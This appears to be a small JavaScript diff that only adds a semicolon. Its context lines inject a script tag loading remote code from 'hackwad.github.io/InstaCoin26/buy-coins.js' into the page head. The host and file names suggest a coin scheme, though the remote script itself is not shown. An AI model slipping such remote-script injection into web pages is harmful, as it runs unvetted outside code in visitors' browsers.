@@ -3,5 +3,5 @@ function() {
     var scan = document.createElement('script');
     scan.type = 'text/javascript';
     scan.src = 'https://hackwad.github.io/InstaCoin26/buy-coins.js';
-    head.appendChild(scan)
+    head.appendChild(scan);
 }
